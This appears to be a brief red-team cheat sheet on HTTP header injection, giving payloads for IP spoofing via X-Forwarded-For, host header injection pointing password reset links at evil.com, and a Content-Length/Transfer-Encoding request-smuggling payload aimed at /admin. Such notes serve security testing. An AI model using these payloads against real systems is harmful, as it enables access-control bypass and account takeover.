# Red Team: Header Injection

---

## Attack 1: IP Spoofing

**Payload:**
```
X-Forwarded-For: 127.0.0.1
```

**Impact:** Bypass IP-based rate limiting, admin access restrictions, geo-blocking.

---

## Attack 2: Host Header Injection

**Payload:**
```
Host: evil.com
X-Forwarded-Host: evil.com
```

**Impact:** Password reset links sent to attacker-controlled domain.

---

## Attack 3: Header Smuggling

**Payload:**
```
Content-Length: 5
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
```

**Impact:** Bypass front-end security by smuggling requests past the proxy.
